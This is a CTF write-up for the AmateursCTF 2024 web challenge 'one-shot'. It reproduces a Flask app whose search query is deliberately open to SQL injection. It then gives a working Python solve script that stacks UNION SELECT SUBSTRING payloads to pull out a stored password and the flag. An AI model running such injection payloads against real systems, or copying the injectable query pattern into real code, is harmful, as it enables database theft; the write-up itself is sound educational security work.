---
title: "one-shot"
description: "my friend keeps asking me to play OneShot. i haven't, but i made this cool challenge! "
pubDate: 2024-04-10
ctf: "AmateursCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-amateursctf/icon.png"
---

I was actually quite proud of how I solved this challenge, I thought the solution was interesting and made me experiment with some unique SQLi.

The challenge gives us an `app.py` and a `Dockerfile`.

Inside `app.py` was the following:
```python
from flask import Flask, request, make_response
import sqlite3
import os
import re

app = Flask(__name__)
db = sqlite3.connect(":memory:", check_same_thread=False)
flag = open("flag.txt").read()

@app.route("/")
def home():
    return """
    <h1>You have one shot.</h1>
    <form action="/new_session" method="POST"><input type="submit" value="New Session"></form>
    """

@app.route("/new_session", methods=["POST"])
def new_session():
    id = os.urandom(8).hex()
    db.execute(f"CREATE TABLE table_{id} (password TEXT, searched INTEGER)")
    db.execute(f"INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)")
    res = make_response(f"""
    <h2>Fragments scattered... Maybe a search will help?</h2>
    <form action="/search" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="query" value="">
        <input type="submit" value="Find">
    </form>
""")
    res.status = 201

    return res

@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."
    
    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""

@app.route("/guess", methods=["POST"])
def guess():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    result = db.execute(f"SELECT password FROM table_{id} WHERE password = ?", (request.form['password'],)).fetchone()
    if result != None:
        return flag
    
    db.execute(f"DROP TABLE table_{id}")
    return "You failed. <a href='/'>Go back</a>"

@app.errorhandler(500)
def ise(error):
    original = getattr(error, "original_exception", None)
    if type(original) == sqlite3.OperationalError and "no such table" in repr(original):
        return "that table is gone. <a href='/'>Go back</a>"
    return "Internal server error"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

So from reading this code, we have SQLi on the `query` parameter on `/search` (specifically seen in this line: `query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")`).

But we only get one character out from the start! ...right? Well the `fetchall()` and the `for` makes me think that we could exfiltrate the string character by character.

The payload I theorised was using an escape from the `LIKE` statement then using `' AND 1=2 UNION SELECT SUBSTRING(password,1,2) FROM table_{id} WHERE password LIKE '%'` and then stacking `UNION` statements to read the string line by line.

This works... kind of. They are sorted in no particular order so we have to do another way of distinguishing order. The way I thought of was to utilise the `SUBSTRING` with a different length at the end, so we will get increasing `*` in order. But, we encounter that the key starts using the same values again which gives us the same issue of not knowing what characters go where! Hmm...

I found from some research you can add a string to a variable in a query by doing the following: `(variable || "string")` and it will add it. So, the new SQL query modifies `password` to `(password | {'A'*32})` to make sure the string is long enough.

In the end I develop the following script to automate the solution (which I am quite proud of):
```python
import requests

HOST="http://one-shot.amt.rs"
LENGTH_OF_PASSWORD=32
table_id = requests.post(f'{HOST}/new_session').content.decode('utf-8').split('value="')[1].split('"')[0]

print(f"Got table id: {table_id}")

print('Generating payload...')

payload="' AND 1=2"
vals=[]
for x in range(1,LENGTH_OF_PASSWORD+1):
    payload+=f" UNION SELECT SUBSTRING((password || '{'A'*LENGTH_OF_PASSWORD}'), {x}, {x+1}) FROM table_{table_id} WHERE password LIKE '%'"
    vals.append("")
payload+="--"

print('Doing search to extract...')

search_res = requests.post(f'{HOST}/search',data={'id':table_id,'query':payload}).content.decode('utf-8')
password=""
for x in search_res.split('<li>'):
    if '</li>' in x:
        x=x.split('</li>')[0]
        vals[x.count('*')-1]=x.split('*')[0]
for x in vals:
    if x != "":
        password+=x
print(f"Got {password}, submitting...")

flag = requests.post(f'{HOST}/guess',data={'id':table_id,'password':password}).content

print(flag.decode('utf-8'))
```

```
$ python3 solve.py
Got table id: 833407575969098d
Generating payload...
Doing search to extract...
Got 44c64cd9ce505a528d9055f9b7279490, submitting...
<p>amateursCTF{go_union_select_a_life}</p>
<br />
<h3>alternative flags (these won't work) (also do not share):</h3>
<p>
... (i was told not to share, so i dont!)
</p>
```

Flag: `amateursCTF{go_union_select_a_life}`